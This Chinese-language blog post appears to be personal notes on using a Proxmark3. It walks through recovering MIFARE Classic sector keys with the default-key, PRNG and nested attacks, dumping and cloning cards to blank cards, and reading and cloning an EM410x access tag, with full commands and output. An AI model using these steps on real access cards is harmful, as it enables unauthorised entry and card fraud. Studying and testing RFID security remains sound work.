---
layout: post
category: 运维
---
![](/assets/img/15517861987812.jpg)

# 1 MAC链接设备

## 1.1 安装
 
```
#linux安装
/usr/bin/ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"

#mac 安装
# 添加 proxmark3 仓库
brew tap proxmark/proxmark3
# 安装稳定版本 proxmark3 客户端
brew install proxmark3

```


## 1.2  链接设备
```
查看当前设备
➜  ~ ls /dev/cu*
/dev/cu.Bluetooth-Incoming-Port /dev/cu.usbmodem14201

#链接设备
➜  ~  proxmark3 /dev/cu.usbmodem14201


#测试电压
proxmark3> hw  tune

Measuring antenna characteristics, please wait.........
# LF antenna: 70.95 V @   125.00 kHz
# LF antenna: 53.62 V @   134.00 kHz
# LF optimal: 73.15 V @   122.45 kHz
# HF antenna: 30.27 V @    13.56 MHz
Displaying LF tuning graph. Divisor 89 is 134khz, 95 is 125khz.
```
# 2 卡片分类

![-w880](/assets/img//16004289353343.jpg)


![-w930](/assets/img//16004288903081.jpg)

# 3 破解
## 3.1 高频卡破解
```
#查看卡id
hf 14a reader



# 内置密码进行探测
proxmark3> hf mf chk *1 ? t

No key specified, trying default keys
chk default key[ 0] ffffffffffff
chk default key[ 1] 000000000000
chk default key[ 2] a0a1a2a3a4a5
chk default key[ 3] b0b1b2b3b4b5
...
chk default key[16] 533cb6c723f6
chk default key[17] 8fd0a4f256e9

To cancel this operation press the button on the proxmark...
--o
|---|----------------|---|----------------|---|
|sec|key A           |res|key B           |res|
|---|----------------|---|----------------|---|
|000|  000000000000  | 1 |  ffffffffffff  | 0 |
|001|  000000000000  | 1 |  ffffffffffff  | 0 |
|002|  000000000000  | 1 |  ffffffffffff  | 0 |
...
|013|  ffffffffffff  | 0 |  ffffffffffff  | 0 |
|014|  ffffffffffff  | 0 |  ffffffffffff  | 0 |
|015|  ffffffffffff  | 0 |  ffffffffffff  | 0 |
|---|----------------|---|----------------|---|
Found keys have been transferred to the emulator memory


1.通过 PRNG 漏洞攻击，无条件获得 0 扇区密匙
hf mf mifare

2.利用 MFOC 漏洞，用已知扇区密匙求所有扇区密匙
hf mf nested 1 0 A ffffffffffff d

Nested statistic:
Iterations count: 81
Time in nested: 62.543 (0.772 sec per key)
|---|----------------|---|----------------|---|
|sec|key A           |res|key B           |res|
|---|----------------|---|----------------|---|
|000|  757461626c65  | 1 |  ffffffffffff  | 1 |
|001|  757461626c65  | 1 |  ffffffffffff  | 1 |
|002|  757461626c65  | 1 |  ffffffffffff  | 1 |
|003|  757461626c65  | 1 |  ffffffffffff  | 1 |
|004|  757461626c65  | 1 |  ffffffffffff  | 1 |
|005|  757461626c65  | 1 |  ffffffffffff  | 1 |
|006|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
|007|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
|008|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
|009|  474249439904  | 1 |  474249439904  | 1 |
|010|  474249439904  | 1 |  474249439904  | 1 |
|011|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
|012|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
|013|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
|014|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
|015|  ffffffffffff  | 1 |  ffffffffffff  | 1 |
|---|----------------|---|----------------|---|
Printing keys to binary file dumpkeys.bin...


3.用破解出的密匙把卡片数据读出导入电脑(dumpdata.bin)
hf mf dump

4.转换 dumpdata.bin 文件到 xxxxx.eml 格式
script run dumptoemul.lua

5.写入到白卡
hf mf cload F075F95D

1.reset uid card
script run formatMifare


方法2

1.将dumpdata.bin写回卡片(密码不会改变)
hf mf restore

2.修改密码
hf mf wrbl 43 B FFFFFFFFFFFF 474249439904ff078000474249439904
```

![-w621](/assets/img//15517881985229.jpg)

## 3.2 低频卡破解


```
proxmark3> lf search
NOTE: some demods output possible binary
  if it finds something that looks like a tag
False Positives ARE possible


Checking for known tags:

EM410x pattern found:

EM TAG ID      : 1900B6E8C5

Possible de-scramble patterns
Unique TAG ID  : 98006D17A3
HoneyWell IdentKey {
DEZ 8          : 11987141
DEZ 10         : 0011987141
DEZ 5.5        : 00182.59589
DEZ 3.5A       : 025.59589
DEZ 3.5B       : 000.59589
DEZ 3.5C       : 182.59589
DEZ 14/IK2     : 00107386169541
DEZ 15/IK3     : 000652842178467
DEZ 20/ZK      : 09080000061301071003
}
Other          : 59589_182_11987141
Pattern Paxton : 432744133 [0x19CB26C5]
Pattern 1      : 7975761 [0x79B351]
Pattern Sebury : 59589 54 3598533  [0xE8C5 0x36 0x36E8C5]

Valid EM410x ID Found!
Waiting for a response from the proxmark...
You can cancel this operation by pressing the pm3 button
Command timed out


proxmark3> lf hid clone 1900B6E8C5
#db# DONE!
```


# 参考资料
RFID 低频卡安全分析  https://cloud.tencent.com/developer/article/1180090
Proxmark3 Easy破解门禁卡学习过程 https://lzy-wi.github.io/2018/07/26/proxmark3/
Proxmark3（PM3）入门使用 https://blog.2broear.com/notes/proxmark3-pm3-record_200508
使用pm3及变色龙获取加密卡信息写入小米手环NFC版 https://post.smzdm.com/p/777188/

使用PM3读取银行闪付卡  http://pm3.echo.cool/index.php/2019/02/23/%e4%bd%bf%e7%94%a8pm3%e8%af%bb%e5%8f%96%e9%93%b6%e8%a1%8c%e9%97%aa%e4%bb%98%e5%8d%a1/

博客： http://pm3.echo.cool/index.php/category/pm3/page/2/

在 macOS 上使用 Proxmark3 https://blog.meow.page/archives/proxmark3-on-mac/

低频卡t5577写入 https://blog.meow.page/archives/Clone-access-card-of-office/

在Linux系统上使用proxmark3 https://blog.meow.page/archives/use-proxmark3-on-linux/

Proxmark3 Mifare Classic 1k Weak / Hard: https://guillaumeplayground.net/proxmark3-hardnested/